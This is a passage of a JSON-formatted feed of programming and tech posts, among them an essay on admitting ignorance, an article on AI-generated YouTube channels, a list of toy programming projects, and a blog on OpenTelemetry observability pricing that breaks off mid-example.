just need to get within like 10 meters of your plant to water it, but I'm still playing with these values to see what ends up being a good fit. Used to have it at 5 metres before but it made development a pain. The browser's geolocation api is so unreliable that I'd avoid it in future projects.</p><p>Been using it during development and it's actually getting me to go places more regularly but my plant graveyard is embarrassingly large though.</p><p>Here's a link to the repo and the live site for anyone interested in trying it out: <a href=\"https://github.com/jasonuc/moota\">GitHub</a> | <a href=\"https://moota.app\">Live Site</a></p>","contentLength":1722,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Exploring Text Classification: Is Golang Viable or Should I Use Pytho","url":"https://www.reddit.com/r/golang/comments/1lobi9d/exploring_text_classification_is_golang_viable_or/","date":1751299659,"author":"/u/Fit_Honeydew4256","guid":178630,"unread":true,"content":"<p>Hi everyone, I’m still in the early stages of exploring a project idea where I want to classify text into two categories based on writing patterns. I haven’t started building anything yet — just researching the best tools and approaches.</p><p>Since I’m more comfortable with Go (Golang), I’m wondering:</p><p>Is it practical to build or run any kind of text classification model using Go?</p><p>Has anyone used Go libraries like Gorgonia, goml, or onnx-go for something similar?</p><p>Would it make more sense to train the model in Python and then call it from a Go backend (via REST or gRPC)?</p><p>Are there any good examples or tutorials that show this kind of hybrid setup?</p><p>I’d appreciate any tips, repo links, or general advice from folks who’ve mixed Go with ML. Just trying to figure out the right path before diving in.</p>","contentLength":806,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I made a functional 8-bit adder/subtractor circuit that works natively within MS Paint","url":"https://github.com/RRTogunov/MSPaintComputer","date":1751299598,"author":"/u/jkjkjij22","guid":176884,"unread":true,"content":"<p>I built all logic gates using the bucket/fill tool. These were combined to make an 8-bit ripple-carry adder as well as an 8-bit adder/subtractor circuit. </p><ol><li>Define inputs A and B (white = 0, black = 1) using bucket fill.</li><li>To run the circuit/computation, use the colour picker and fill tool to cycle through a sequence of colour changes from the “Bus” and “Probe” squares on the left and apply them to the circuit leads on the right.</li></ol><p>This is where my knowledge of computer science ends, and I'm not sure how far this could theoretically be taken. </p><p>There are a few quirks that make this particularly challenging. For example, all logical components of the circuit are single-use (i.e., at the end of the computation, the entire circuit is black/white, and all the colour pixel logic is lost). Also, because this is in 2-dimensions it's not possible to cross/bridging/tunnel \"wires\" to make complex compound logic gates (XOR and XNOR). There's also a challenge with back-propagation, where colour fills don't just go forward down the circuit, but travel back and affect other parts of the circuit.<a href=\"https://www.reddit.com/r/mspaint/comments/1le7vqo/i_built_a_working_8bit_ripple_carry_adder_in_ms/\"></a></p>","contentLength":1095,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lobham/i_made_a_functional_8bit_addersubtractor_circuit/"},{"title":"Don’t Be Ashamed to Say \"I Don’t Know\"","url":"https://www.thecoder.cafe/p/i-dont-know","date":1751298911,"author":"/u/teivah","guid":176816,"unread":true,"content":"<p><em>Hello! Today, let’s discuss the power of “I don’t know“ with a personal story.</em></p><p>Last month, I was at the hospital with my partner for the birth of our newborn. During our stay, my partner experienced a specific symptom, and we wanted to understand what could be causing it. So we asked the midwife.</p><p>We immediately noticed the hesitation in her eyes. When she finally gave an answer, it came with a kind of forced confidence, and we both felt she wasn’t sure about it.</p><p>At our hospital, midwives do 12-hour shifts. So a few hours later, we asked the exact same question to the next midwife. Same hesitation, but this time, a different answer.</p><p>And so it went on. Every shift, we asked again. Every time, a different answer. Eventually, it even became a game between my partner and me: trying to guess what the next answer would be.</p><p>Until… The one. The one who broke this cycle.</p><p>We asked her the same question. She paused. Thought about it. And then said something unexpected:</p><p>Twenty minutes later, she even came back to our room and said:</p><div><p>I asked the doctor, the answer is because of [X]. Thanks for asking, I learned something.</p></div><p>That brief exchange resonated with me.</p><p>In our field, we often put a lot of weight on posture. We build up our position as the go-to person for a codebase, a data model, or a framework. The more we know, the more we are seen as the one to consult or include in any related discussion.</p><p>But from that posture, admitting we don’t know something can feel like pulling out the bottom card in a house of cards. Suddenly, it feels like everything we built to earn that status might collapse.</p><p>Yet, if we take a step back, admitting we don’t know shouldn’t be seen as something shameful or embarrassing. In fact, it’s often the most responsible thing we can do.</p><ul><li><p><strong>Pretending to know can lead to bad decisions.</strong></p></li><li><p><strong>Authority isn’t built on knowing everything.</strong></p></li><li><p><strong>Teams work better when people feel safe to admit uncertainty.</strong></p></li><li><p><strong>Curiosity + humility = real learning. </strong></p></li></ul><p>Whether it’s for us or others, next time we don’t know something, let’s be like that midwife: let’s just admit it. Without shame.</p><p><em>How comfortable are you with saying “I don’t know“?</em></p><p><em>If you made it this far and enjoyed the post, please consider giving it a like.</em></p>","contentLength":2247,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lob6fa/dont_be_ashamed_to_say_i_dont_know/"},{"title":"4 of the top 10 YouTube channels are AI-generated","url":"https://sherwood.news/tech/ai-created-videos-are-quietly-taking-over-youtube/","date":1751295343,"author":"/u/Alone-Competition-77","guid":176749,"unread":true,"content":"<p>YouTube has never stayed still for long.&nbsp;</p><p>The video powerhouse owned by  started its life as a place to upload home movies, only to use its early scale to morph into a user-generated MTV, birthing an entire universe of homegrown celebrities. It’s since evolved in two competing directions: incentivizing longer, more professional videos to compete with Netflix but also shorter, more ephemeral videos to compete with TikTok.</p><p>And it looks as if it’s changing again. The age of AI has finally arrived for YouTube, and it could be its most existential shift yet.</p><p>Over the past few months, Garbage Day has tracked how a range of AI-generated videos have found increasing success on the platform, taking up attention and space over more professional creators. More than a few of them seemingly rely on inauthentic engagement to boost their attention — though, in a platform overrun with AI, it’s worth asking if that even matters.</p><p>At the same time, though, some of YouTube’s biggest success stories have shown less and less interest in the platform, focusing their efforts and promotion on places like TikTok and Instagram. All of this suggests a watershed moment for the internet’s biggest video site.&nbsp;</p><p>In May, four of the top 10 YouTube channels with the most subscribers featured AI-generated material in every video. Not all the channels are using the same AI programs, and there are indications that some contain human-made elements, but none of these channels has ever uploaded a video that was made entirely without AI — and each has uploaded a constant stream of videos, which is crucial to their success.</p><p>While not all of the videos from these AI channels are identical, the most successful examples tend to find a theme and stick to it. Some, like “<a href=\"https://www.youtube.com/@ChickofHonor-t3i/shorts\" target=\"_blank\" rel=\"noopener\">Chick of Honor</a>,” use tools like <a href=\"https://hailuoai.video/\" target=\"_blank\" rel=\"noopener\">Hailuo</a> for the instantly established format of <a href=\"https://www.bbc.com/future/article/20240819-why-these-ai-cat-videos-may-be-the-internets-future\" target=\"_blank\" rel=\"noopener\">cute animals</a> in visibly dangerous or tragic situations. Others, like “<a href=\"https://www.youtube.com/@MastersOfProphecy\" target=\"_blank\" rel=\"noopener\">Masters of Prophecy</a>,” upload AI-generated music videos for AI-generated songs, made with <a href=\"https://suno.ai\" target=\"_blank\" rel=\"noopener\">Suno</a> to evoke ’80s synth nostalgia.</p><p>This is a profound change in how YouTube looked even just six months ago. In January, for instance, the most popular account making videos with AI got 2.5 million subscribers and 220 million views — barely in the top 20 for the month. In June, the top four AI channels combined to get more than 23 million subscribers and 800 million views. The algorithm clearly favors AI channels now, enough that they’re getting a much better ratio of views to subscriptions.</p><p>This does make some sense. Generative-AI-driven channels do fix one core problem YouTube has struggled with ever since it started pushing more professional video content: not every creator has the time, resources, or skills to make Netflix-level content. Google’s ad revenue split doesn’t exactly pay for the costs that come with making your channel more professional, while AI videos all tend to be a certain standard and cost sometimes cents to produce.</p><p>Generating content like this allows YouTubers to keep up with increasingly high demand from the platform’s algorithms, especially where YouTube Shorts are concerned. As the definition of Shorts has <a href=\"https://sherwood.news/tech/does-youtube-have-a-future-if-its-creators-have-to-make-most-of-their-money/\" target=\"_blank\" rel=\"noopener\">changed constantly</a> to keep up with competitors like TikTok, YouTube has focused on their profitability much more than their appeal to creators. Starting in March, the platform <a href=\"https://support.google.com/youtube/thread/333869549/a-change-to-how-we-count-views-on-shorts?hl=en\" target=\"_blank\" rel=\"noopener\">changed the qualification</a> of viewing a Short from watching it for a few seconds to any time the video starts or loops.&nbsp;</p><p>According to <a href=\"https://digiday.com/media/youtube-shorts-view-count-update-wins-over-brands-but-creators-arent-sold/\" target=\"_blank\" rel=\"noopener\">DigiDay</a>, this was done to make tracking engagement metrics for marketers easier, while individual creators still see the same revenue. Meanwhile, Shorts has also become a testing ground for Google’s many AI tools, whether that’s <a href=\"https://lifehacker.com/tech/youtube-shorts-veo-ai-generator\" target=\"_blank\" rel=\"noopener\">making clips with Veo</a> or searching through them with Google Lens. Each popular AI-filled channel uploaded at least one Short in the month of May. Some, like “Chick of Honor,” uploaded entirely Shorts rather than full videos; others just made shorter clips of their videos and streams.</p><p>This all feeds into YouTube’s aspirations for TV domination, as well. A <a href=\"https://techcrunch.com/2025/05/27/youtube-tops-disney-and-netflix-in-tv-viewing-nielsen-finds/\" target=\"_blank\" rel=\"noopener\">report from Nielsen</a> last month shows that it’s maintained the highest share of all TV viewing for several months straight, and it’s been the <a href=\"https://techcrunch.com/2024/02/20/youtube-dominates-tv-streaming-in-u-s-per-nielsens-latest-report/\" target=\"_blank\" rel=\"noopener\">top streaming service</a> for more than a year. This enormous share is reflected in its profits, as <a href=\"https://www.hollywoodreporter.com/business/business-news/youtube-value-revenue-1236176556/\" target=\"_blank\" rel=\"noopener\">recent estimates</a> say the platform is set to surpass Disney as the world’s most profitable media company. YouTube has tried to present itself as a competitor to streaming services for years, <a href=\"https://adage.com/article/special-report-newfronts/youtube-puts-shorts-center-newfronts-pitch/2491851/\" target=\"_blank\" rel=\"noopener\">showcasing users</a> like Alan Chikin Chow, whose YouTube videos are made in a <a href=\"https://variety.com/2024/digital/news/alan-chikin-chow-production-space-los-angeles-1236218119/\" target=\"_blank\" rel=\"noopener\">massive production studio</a>. But AI-generated music channels can play just as easily on a TV without any of the production costs.</p><p>Masters of Prophecy is currently the fastest-growing channel across all of YouTube, going from a few hundred subscribers in February to over 30 million in June, and all of its content is AI-generated. But that growth looks suspicious, especially looking at how it began by going from less than 300 subscribers to more than 100,000 in a single day without any new videos, Shorts, or comments in that time. But again, on a platform increasingly powered — and populated — by AI, what does inauthentic growth even mean? At the end of the day, an AI bot isn’t going to buy a product from an advertiser.</p><p>It’s clear that YouTube doesn’t want to answer that question. In many ways, it feels like it’s hoping no one notices how popular AI content is. With a quiet misdirect, and if users (and more importantly, advertisers) don’t complain, everyone will just keep making money.&nbsp;</p><p>But it also means that at some point in the near future, you’ll open up the app and suddenly realize there aren’t any humans on it anymore.</p><p><a href=\"https://www.garbageday.email/\" target=\"_blank\" rel=\"noopener\"></a><i> is an award-winning newsletter that focuses on web culture and technology, covering a mix of memes, trends, and internet drama. We also run a program called Garbage Intelligence, a monthly report tracking the rise and fall of creators and accounts across every major platform on the web. We’ll be sharing some of our findings here on Sherwood News. </i><a href=\"https://www.garbageday.email/subscribe\" target=\"_blank\" rel=\"noopener\"><i>You can subscribe to Garbage Day here.</i></a></p>","contentLength":6126,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1lo9mqg/4_of_the_top_10_youtube_channels_are_aigenerated/"},{"title":"Writing Toy Programs is a great way to remember why you started programming","url":"https://blog.jsbarretto.com/post/software-is-joy","date":1751295103,"author":"/u/Tech_User_Station","guid":176747,"unread":true,"content":"<p>I am a huge fan of Richard Feyman’s famous quote:</p><blockquote><p>“What I cannot create, I do not understand”</p></blockquote><p>I think it’s brilliant, and it remains true across many fields (if you’re willing to be a little creative with the\ndefinition of ‘create’). It is to this principle that I believe I owe everything I’m truly good at. Some will tell you\nto avoid reinventing the wheel, but they’re wrong: you  build your own wheel, because it’ll teach you more about\nhow they work than reading a thousand books on them ever will.</p><p>In 2025, the beauty and craft of writing software is being eroded. AI is threatening to replace us (or, at least, the\nmost joyful aspects of our craft) and software development is being increasingly commodified, measured, packaged, and\nindustrialised. Software development needs more simple joy, and I’ve found that creating toy programs is a great way to\nremember why I started working with computers again.</p><p>Toy programs follow the 80:20 rule: 20% of the work, 80% of the functionality. The point is  to build\nproduction-worthy software (although it is true that some of the best production software began life as a toy).\nAggressively avoid over-engineering, restrict yourself to only whatever code is necessary to achieve your goal. Have\nevery code path panic/crash until you’re forced to implement it to make progress. You might be surprised by just how\neasy it is to build toy versions of software you might previously have considered to be insummountably difficult to\ncreate.</p><p>I’ve been consistently surprised by just how often some arcane nugget of knowledge I’ve acquired when working on a toy\nproject has turned out to be immensely valuable in my day job, either by giving me a head-start on tracking down a\nproblem in a tool or library, or by recognising mistakes before they’re made.</p><p>Understanding the constraints that define the shape of software is vital for working with it, and there’s no better way\nto gain insight into those constraints than by running into them head-first. You might even come up with some novel\nsolutions!</p><p>Here is a list of toy programs I’ve attempted over the past 15 years, rated by difficulty and time required. These\nratings are estimates and assume that you’re already comfortable with at least one general-purpose programming language\nand that, like me, you tend to only have an hour or two per day free to write code. Also included are some suggested\nresources that I found useful.</p><h3>Regex engine (difficulty = 4/10, time = 5 days)</h3><p>A regex engine that can read a POSIX-style regex program and recognise strings that match it. Regex is simple yet\nshockingly expressive, and writing a competent regex engine will teach you everything you need to know about using the\nlanguage too.</p><h3>x86 OS kernel (difficulty = 7/10, time = 2 months)</h3><p>A multiboot-compatible OS kernel with a simple CLI, keyboard/mouse driver, ANSI escape sequence support, memory manager,\nscheduler, etc. Additional challenges include writing an in-memory filesystem, user mode and process isolation, loading\nELF executables, and supporting enough video hardware to render a GUI.</p><h3>GameBoy/NES emulator (difficulty = 6/10, time = 3 weeks)</h3><p>A crude emulator for the simplest GameBoy or NES games. The GB and the NES are classics, and both have relatively simple\ninstruction sets and peripheral hardware. Additional challenges include writing competent PPU (video) and PSG (audio)\nimplementations, along with dealing with some of the more exotic cartridge formats.</p><h3>GameBoy Advance game (difficulty = 3/10, time = 2 weeks)</h3><p>A sprite-based game (top-down or side-on platform). The GBA is a beautiful little console to write code for and there’s\nan active and dedicated development community for the console. I truly believe that the GBA is one of the last game\nconsoles that can be fully and completely understood by a single developer, right down to instruction timings.</p><h3>Physics engine (difficulty = 5/10, time = 1 week)</h3><p>A 2D rigid body physics engine that implements Newtonian physics with support for rectangles, circles, etc. On the\nsimplest end, just spheres that push away from one-another is quite simple to implement. Things start to get complex\nwhen you introduce more complex shapes, angular momentum, and the like. Additional challenges include making collision\nresolution fast and scaleable, having complex interactions move toward a steady state over time, soft-body interactions,\netc.</p><h3>Dynamic interpreter (difficulty = 4/10, time = 1-2 weeks)</h3><p>A tree-walking interpreter for a JavaScript-like language with basic flow control. There’s an unbounded list of extra\nthings to add to this one, but being able to write programs in my own language still gives me child-like elation. It\nfeels like a sort of techno-genesis: once you’ve got your own language, you can start building the universe within it.</p><h3>Compiler for a C-like (difficulty = 8/10, time = 3 months)</h3><p>A compiler for a simply-typed C-like programming language with support for at least one target archtecture. Extra\nchallenges include implementing some of the most common optimisations (inlining, const folding, loop-invariant code\nmotion, etc.) and designing an intermediate representation (IR) that’s general enough to support multiple backends.</p><h3>Text editor (difficulty = 5/10, time = 2-4 weeks)</h3><p>This one has a lot of variability. At the blunt end, simply reading and writing a file can be done in a few lines of\nPython. But building something that’s closer to a daily driver gets more complex. You could choose to implement the UI\nusing a toolkit like QT or GTK, but I personally favour an editor that works in the console. Properly handling unicode,\nsyntax highlighting, cursor movement, multi-buffer support, panes/windows, tabs, search/find functionality, LSP support,\netc. can all add between a week or a month to the project. But if you persist, you might join the elite company of those\ndevelopers who use an editor of their own creation.</p><h3>Async runtime (difficulty = 6/10, time = 1 week)</h3><p>There’s a lot of language-specific variability as to what ‘async’ actually means. In Rust, at least, this means a\nlibrary that can ingest  tasks and poll them concurrently until completion. Adding support for I/O waking\nmakes for a fun challenge.</p><h3>Hash map (difficulty = 4/10, time = 3-5 days)</h3><p>Hash maps (or sets/dictionaries, as a higher-level language might call them) are a programmer’s bread &amp; butter. And yet,\nsurprisingly few of us understand how they really work under the bonnet. There are a plethora of techniques to throw\ninto the mix too: closed or open addressing, tombstones, the robin hood rule, etc. You’ll gain an appreciation for when\nand why they’re fast, and also when you should just use a vector + linear search.</p><h3>Rasteriser / texture-mapper (difficulty = 6/10, time = 2 weeks)</h3><p>Most of us have played with simple 3D graphics at some point, but how many of us truly understand how the graphics\npipeline works and, more to the point, how to fix it when it doesn’t work? Writing your own software rasteriser will\ngive you that knowledge, along with a new-found appreciation for the beauty of vector maths and half-spaces that have\napplications across many other fields. Additional complexity involves properly implementing clipping, a Z-buffer, N-gon\nrasterisation, perspective-correct texture-mapping, Phong or Gouraud shading, shadow-mapping, etc.</p><h3>SDF Rendering (difficulty = 5/10, time = 3 days)</h3><p>Signed Distance Fields are a beautifully simple way to render 3D spaces defined through mathematics, and are perfectly\nsuited to demoscene shaders. With relatively little work you can build yourself a cute little visualisation or some\nmoving shapes like the graphics demos of the 80s. You’ll also gain an appreciation for shader languages and vector\nmaths.</p><h3>Voxel engine (difficulty = 5/10, time = 2 weeks)</h3><p>I doubt there are many reading this that haven’t played Minecraft. It’s surprisingly easy to build your own toy voxel\nengine cut from a similar cloth, especially if you’ve got some knowledge of 3D graphics or game development already. The\nsimplicity of a voxel engine, combined with the near-limitless creativity that can be expressed with them, never ceases\nto fill me with joy. Additional complexity can be added by tackling textures, more complex procedural generation,\nfloodfill lighting, collisions, dynamic fluids, sending voxel data over the network, etc.</p><h3>Threaded Virtual Machine (difficulty = 6/10, time = 1 week)</h3><p>Writing interpreters is great fun. What’s more fun? . If you keep pushing interpreters as far as\nthey can go without doing architecture-specific codegen (like AOT or JIT), you’ll eventually wind up (re)discovering\n (not to be confused with multi-threading, which is a very different beast). It’s a beautiful way of\nweaving programs together out highly-optimised miniature programs, and a decent implementation can even give an AOT\ncompiler a run for its money in the performance department.</p><h3>GUI Toolkit (difficulty = 6/10, time = 2-3 weeks)</h3><p>Most of us have probably cobbled together a GUI program using tkinter, GTK, QT, or WinForms. But why not try writing\nyour GUI toolkit? Additional complexity involves implementing a competent layout engine, good text shaping (inc.\nunicode support), accessibility support, and more. Fair warning: do not encourage people to use your tool unless it’s\n - the world has enough GUIs with little-to-no accessibility or localisation support.</p><h3>Orbital Mechanics Sim (difficulty = 6/10, time = 1 week)</h3><p>A simple simulation of Newtonian gravity can be cobbled together in a fairly short time. Infamously, gravitational\nsystems with more than two bodies cannot be solved analytically, so you’ll have to get familiar with iterative\n methods. Additional complexity comes with implementing more precise and faster integration methods,\naccounting for relativistic effects, and writing a visualiser. If you’ve got the maths right, you can even try plugging\nin real numbers from NASA to predict the next high tide or full moon.</p><h3>Bitwise Challenge (difficulty = 3/10, time = 2-3 days)</h3><p>Here’s one I came up with for myself, but I think it would make for a great game jam: write a game that only persists 64\nbits of state between subsequent frames. That’s 64 bits for everything: the entire frame-for-frame game state should be\nreproducible using only 64 bits of data. It sounds simple, but it forces you to get incredibly creative with your game\nstate management. Details about the rules can be found on the GitHub page below.</p><h3>An ECS Framework (difficulty = 4/10, time = 1-2 weeks)</h3><p>For all those game devs out there: try building your own <a href=\"https://en.wikipedia.org/wiki/Entity_component_system\">ECS</a>\nframework. It’s not as hard as you might think (you might have accidentally done it already!). Extra points if you can\nbuild in safety and correctness features, as well as good integration with your programming language of choice’s type\nsystem features.</p><p>I built a custom ECS for my <a href=\"https://www.youtube.com/watch?v=nS5rj80L-pk\">Super Mario 64 on the GBA</a> project due to the\nunique performance and memory constraints of the platform, and enjoyed it a lot.</p><h3>CHIP-8 Emulator (difficulty = 3/10, time = 3-6 days)</h3><p>The <a href=\"https://en.wikipedia.org/wiki/CHIP-8\">CHIP-8</a> is a beautifully simple virtual machine from the 70s. You can write\na fully compliant emulator in a day or two, and there are an enormous plethora of fan-made games that run on it.\n<a href=\"https://github.com/zesterer/emul8/raw/refs/heads/master/test/test.ch8\">Here’s</a> a game I made for it.</p><h3>Chess engine (difficulty = 5/10, time = 2-5 days)</h3><p>Writing a chess engine is great fun. You’ll start off with every move it makes being illegal, but over time it’ll get\nsmart and smarter. Experiencing a loss to your own chess engine really is a rite of passage, and it feels magical.</p><h3>POSIX shell (difficulty = 4/10, time = 3-5 days)</h3><p>We interact with shells every day, and building one will teach you can incredible amount about POSIX - how it works, and\nhow it doesn’t. A simple one can be built in a day, but compliance with an existing shell language will take time and\nteach you more than you ever wanted to know about its quirks.</p><h2>A note on learning and LLMs</h2><p>Perhaps you’re a user of LLMs. I get it, they’re neat tools. They’re useful for certain kinds of learning. But I might\nsuggest resisting the temptation to use them for projects like this. Knowledge is not supposed to be fed to you on a\nplate. If you want that sort of learning, read a book - the joy in building toy projects like this comes from an\nexploration of the unknown, without polluting one’s mind with an existing solution. If you’ve been using LLMs for a\nwhile, this cold-turkey approach might even be painful at first, but persist. There is no joy without pain.</p><p>The runner’s high doesn’t come to those that take the bus.</p>","contentLength":12598,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1lo9j7g/writing_toy_programs_is_a_great_way_to_remember/"},{"title":"Won at a Hackathon","url":"https://www.reddit.com/r/linux/comments/1lo968z/won_at_a_hackathon/","date":1751294233,"author":"/u/MasterBach","guid":176700,"unread":true,"content":"<p>Internal corporate hackathon. Red hat guys were onsite for the duration of it. </p>","contentLength":79,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"OpenTelemetry is Great, But Who the Hell is Going to Pay For It?","url":"https://www.adatosystems.com/2025/02/10/who-the-hell-is-going-to-pay-for-this/","date":1751291923,"author":"/u/finallyanonymous","guid":176696,"unread":true,"content":"<p>I’ve specialized in monitoring and observability for 27 years now, and I’ve seen a lot of tools and techniques come and go (RMon, anyone?); and more than a few come and stay (Rumors of the death of SNMP have been – and continue to be – greatly exaggerated.). Lately I’ve been exploring one of the more recent improvements in the space – OpenTelemetry (which I’m abbreviating to “OTel” for the remainder of this blog). <a href=\"https://www.adatosystems.com/2025/02/04/o-can-you-tel-me-how-to-get/\">I wrote about my decision to dive into OTel recently</a>.</p><p>For the most part, I’m enjoying the journey. But there’s a problem that has existed with observability for a while now, and it’s something OTel is not helping. The title of this post hints at the issue, but I want to be more explicit. Let’s start with some comparison shopping.</p><p>Before I piss off every vendor in town, I want to be clear that these are broad, rough, high level numbers. I’ve linked to the pricing pages if you want to check the details, and I acknowledge what you see below isn’t necessarily indicative of the price you might actually pay after getting a quote on a real production environment.</p><ul><li>New Relic <a href=\"https://newrelic.com/pricing\">charges</a><ul><li>35¢ per GB for any data you send them.</li></ul></li><li>Datadog has a veritable laundry list of options, but at a high level, they <a href=\"https://www.datadoghq.com/pricing/list/\">charge</a>:\n<ul><li>60¢ – $1.22 per million netflow records</li><li>$1.06-$3.75 per million log records</li><li>$1.27-$3.75 per million spans</li></ul></li><li>Dynatrace’s <a href=\"https://www.dynatrace.com/pricing/rate-card/\">pricing page</a> sports a list almost as long as Datadog’s but some key items:\n<ul><li>15¢ per 100,00 metrics\n<ul><li>plus .07¢ per Gig per day for retention</li></ul></li><li>2¢ per gig for logs\n<ul><li>plus .07¢- per gig per day to retain them</li><li>plus .035¢ per gig queried</li></ul></li><li>Events have the same rate as logs</li></ul></li><li>Grafana, which – it must be noted – is open source and effectively gives you everything for free if you’re willing to do the heavy lifting of installing and hosting. But their <a href=\"https://grafana.com/pricing/\">pricing can be summed up as</a>:\n<ul><li>$8.00 for 1k metrics, (up to 1/minute)</li><li>50¢ per gig for logs and traces them, with 30 days retention</li></ul></li></ul><p>This list is neither exhaustive nor complete. I’ve left off a lot of vendors, not because they also don’t have consumption based pricing but because it would just be more of the same. Even with the ones above, the details here aren’t complete. Some companies not only charge for consumption (ingest), they also charge to store the data, and charge again to query the data (looking at you, New Relic). Some companies push you to pick a tier of service, and if you don’t they’ll charge you an estimated rate based on the 99th percentile of usage for the month (<a href=\"https://www.finout.io/blog/part-2-the-magic-that-is-datadog-pricing\">looking at you, Datadog</a>).&nbsp;</p><p>It should surprise nobody that what appears on their pricing page isn’t even the final word. Some of these companies are, even now, looking at redefining their interpretation of the “consumption based pricing” concept that might make things even more opaque (looking at you AGAIN, New Relic).&nbsp;</p><p>Even with all of that said, I’m going out on a limb and stating for the record that each and every one of those price points is so low that even the word “trivial” is too big.&nbsp;</p><p>That is, until the production workloads meet the pricing sheet. At that point those itty bitty numbers add up to real money, and quickly.</p><p>I put this question out to some friends, asking if they had real-world sticker-shock experiences. As always, my friends did not disappoint.</p><blockquote><p><em>“I did a detailed price comparison of New Relic with Datadog a couple years ago with Fargate as the main usage. New Relic was significantly cheaper until you started shipping logs and then Datadog was suddenly 30-40% cheaper even with apm. [But] their per host cost also factors in and makes APM rather unattractive unless you’re doing something serverless. We wanted to use it on kubernetes but it was so expensive, management refused to believe the costs with services on Fargate so I was usually showing my numbers every 2-3 months.”</em><em> – Evelyn Osman, Head of Platform at enmacc</em></p></blockquote><blockquote><p><em>“All I got is the memory of the CFOs face when he saw the bill.”</em><em> – someone who prefers to remain anonymous, even though that quote is freaking epic.</em></p></blockquote><h2>The First Step is Admitting You Have a Problem</h2><p>Once upon a time (by which I mean the early 2000’s), the challenge with monitoring (observability wasn’t a term we used yet) was how to identify the data we needed, and then get the systems to give up that data, and then store that data in a way that made it possible (let alone efficient) to use in queries, displays, alerts, and such.</p><p>That was where almost all the cost rested. The systems themselves were on-premises and, once the hardware was bought, effectively “free”. The result was that the accepted practice was to collect as much as possible and keep it forever. And despite the change in technology, many organizations reasoning has remained the same.</p><p>Grafana Solutions Architect Alec Isaacson points out his conversations with customers sometimes go like this:</p><blockquote><p><em>“I collect CDM metrics from my most critical systems every 5 seconds because once, a long time ago, someone got yelled at when the system was slow and the metrics didn’t tell them why.”</em></p></blockquote><p>Today, collecting monitoring and observability data (“telemetry”) is comparatively easy, but – both as individuals and organizations – we haven’t changed our framing of the problem. So we continue to grab every piece of data available to us. We instrument our code with every tag and span we can think of; if there’s a log message, we ship it; hardware metrics? Better grab it because it’ll provide context; If there’s network telemetry (NetFlow, VPC Flow logs, Streaming Telemetry) we suck that up too.</p><p>But we never take the time to think about what we’re going to do with it. Ms. Osman’s experience illustrates the result:</p><blockquote><p><em>“[They] had no idea what they were doing with monitoring […] all the instrumentation and logging was enabled then there was lengthy retention “just in case”. So they were just burning ridiculous amounts of money”</em></p></blockquote><p>To connect it to another bad behavior that we’ve (more or less) broken ourselves of: Back in the early days of “lift and shift” (often more accurately described as “lift and shit”) to the cloud, we not only moved applications wholesale; we moved it onto the biggest systems the platform offered. Why? Because in the old on-prem context you could only ask for a server once, and therefore you asked for the biggest thing you could get, in order to future-proof your investment. This decision turned out not only to be amusingly naive, it was horrifically expensive and it took everyone a few years to understand how “elastic compute” worked and to retool their applications for the new paradigm.</p><p>Likewise, it’s high time we recognize and acknowledge that we cannot afford to collect every piece of telemetry data available to us, and moreover, that we don’t have a plan for that data even if money was no object.</p><h2>Admit it: Your Problem Also Has a Problem</h2><p>Let me pivot to OTel for a moment. One of the key reasons – possibly THE key reason – to move to it is to remove, forever and always, the pain of vendor lock-in. This is something I explored <a href=\"https://www.adatosystems.com/2025/02/04/o-can-you-tel-me-how-to-get/\">in my last blog post</a> and was echoed recently by a friend of mine:</p><blockquote><p><em>OTel does solve a lot of the problems around “Oh great! now we’re trapped with vendor x and it’s going to cost us millions to refactor all this code” as opposed to “Oh, we’re switching vendors? Cool, let me just update my endpoint…”</em>&nbsp;&nbsp;&nbsp;– Matt Macdonald-Wallace, Solutions Architect, Grafana Labs</p></blockquote><p>To be very clear, OTel does an amazing job at solving this problem, which is incredible in its own right. BUT… there’s a downside to OTel that people don’t notice right away, if they notice it at all. That problem makes the previous problem even worse.</p><p>OTel takes all of your data (metrics, logs, traces, and the rest), collects it up, and sends it wherever you want it to go. But OTel doesn’t always do it EFFICIENTLY.</p><p>Let’s take the log message below, which comes straight out of&nbsp; syslog. Yes, good old RFC 5424. Born in the 80’s, standardized in 2009, and the undisputed “chatty kathy” of network message protocols. I’ve seen modestly-sized networks generate upwards of 4 million syslog messages per hour. Most of it was absolutely useless drivel, mind you. But those messages had to go somewhere and be processed (or dropped) by some system along the way. It’s one of the reasons I’ve suggested a syslog and trap “filtration system” <a href=\"https://www.adatosystems.com/2017/05/29/logfile-monitoring-i-do-not-think-it-means-what-you-think-it-means/\">since basically forever</a>.</p><p>Nit picking about message volume aside, there’s value in some of those messages, to some IT practitioners, some of the time. And so we have to consider (and collect) them too.</p><pre><code><code>&lt;134&gt;1 2018-12-13T14:17:40.000Z myserver myapp 10 - [http_method=\"GET\"; http_uri=\"/example\"; http_version=\"1.1\"; http_status=\"200\"; client_addr=\"127.0.0.1\"; http_user_agent=\"my.service/1.0.0\"] HTTP request processed successfully</code></code></pre><p>As-is that log message is 228 bytes – barely even a drop in the bucket of telemetry you collect every minute, let alone every day. But for what I’m about to do, I want a real apples-to-apples comparison, so here’s what it would look like if I JSON-ified it:</p><pre><code><code>{\n&nbsp;&nbsp;\"pri\": 134,\n&nbsp;&nbsp;\"version\": 1,\n&nbsp;&nbsp;\"timestamp\": \"2018-12-13T14:17:40.000Z\",\n&nbsp;&nbsp;\"hostname\": \"myserver\",\n&nbsp;&nbsp;\"appname\": \"myapp\",\n&nbsp;&nbsp;\"procid\": 10,\n&nbsp;&nbsp;\"msgid\": \"-\",\n&nbsp;&nbsp;\"structuredData\": {\n      \"http_method\": \"GET\",\n      \"http_uri\": \"/example\",\n      \"http_version\": \"1.1\",\n      \"http_status\": \"200\",\n      \"client_addr\": \"127.0.0.1\",\n      \"http_user_agent\": \"my.service/1.0.0\"\n      &nbsp;&nbsp;},\n&nbsp;&nbsp;\"message\": \"HTTP request processed successfully\"\n}</code></code></pre><p>That bumps the payload up to 336 bytes without whitespace, or 415 bytes with. Now, for comparison, here’s a sample OTLP Log message:</p><pre><code><code>{\n   \"resource\": {\n      \"service.name\": 